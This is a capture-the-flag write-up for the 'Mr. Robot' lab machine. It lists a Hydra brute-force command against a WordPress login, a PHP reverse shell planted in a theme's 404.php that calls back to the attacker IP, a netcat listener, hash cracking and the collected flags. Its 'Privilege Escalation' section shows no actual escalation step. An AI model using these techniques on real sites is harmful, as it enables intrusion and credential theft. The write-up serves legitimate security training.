# **Mr. Robot CTF Report (Kkaxh1)**

**Target IP:** 10.10.10.128
**Attacker IP:** 10.10.10.129

## **1. Nmap Scan Results**

**Open Ports:**

* **80/tcp** – HTTP (Apache httpd)
* **443/tcp** – HTTPS (Apache httpd)
* **22/tcp** – SSH (Closed)

**OS Guessing (Aggressive):**

* Linux Kernel 3.10 – 4.11 (most probable)
* Network Distance: 1 hop
* MAC Address: VMware (00:0C:29\:C6:6F\:C5)

---

## **2. Web Enumeration**

### **Robots.txt**

Found at: `http://10.10.10.128/robots.txt`
Contents:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

* **fsocity.dic** – Wordlist used for brute force
* **key-1-of-3.txt** – First flag:
  **073403c8a58a1f80d943455fb30724b9**

### **Interesting URLs Discovered via Gobuster**

* `/wp-login.php` – WordPress login
* `/admin` – Redirects to wp-admin
* `/license.txt`, `/readme.html`, `/intro`, `/rss`, `/atom`, `/feed`, `/robots.txt`, `/key-1-of-3.txt`
* `/wp-content`, `/wp-includes`, `/js`, `/css`, `/images`, `/audio`, `/video`, `/image`

---

## **3. WordPress Bruteforce**

**Username Discovered:**
`elliot` (found through basic enumeration and confirmed via Hydra)

**Wordlist Used:**
`fsocity.dic` (discovered in `robots.txt`)

**Cracking Method:**
Brute-force using **Hydra** with the following command:

```bash
hydra -l elliot -P fsocity.dic 10.10.10.128 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"
```

**Successful Credentials:**

* **Username:** elliot
* **Password:** ER28-0652

**Key 2 Found (Post Login):**
**822c73956184f694993bede3eb39f959**

---

## **4. Exploitation: Reverse Shell**

After logging into the WordPress dashboard, used **Theme Editor** to replace `404.php` with a PHP reverse shell.

**Payload Source:**
`php-reverse-shell.php` from Pentestmonkey repo

**Modified IP and Port:**

```php
$ip = '10.10.10.129';
$port = 4444;
```

**Listener Setup:**

```bash
nc -lvnp 4444
```

**Trigger URL:**

```
http://10.10.10.128/wp-content/themes/<active-theme>/404.php
```

Reverse shell established successfully.

---

## **5. Post-Exploitation Enumeration**

### **Robot User Credentials**

Found the file:
`/home/robot/password.raw-md5`

Contents:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked the hash using `john` and `rockyou.txt`.
**Password for robot:** `abcdefghijklmnopqrstuvwxyz`

**Switched User:**

```bash
su robot
```

---

## **6. Privilege Escalation**

Enumerated for potential escalation paths.

Discovered the third key using:

```bash
find / -iname key-3-*
```

Found:
`/root/key-3-of-3.txt`

**Final Flag (Key 3):**
**04787ddef27c3dee1ee161b21670b4e4**

---

## **7. Summary of Flags Collected**

* **Key 1:** 073403c8a58a1f80d943455fb30724b9
* **Key 2:** 822c73956184f694993bede3eb39f959
* **Key 3:** 04787ddef27c3dee1ee161b21670b4e4


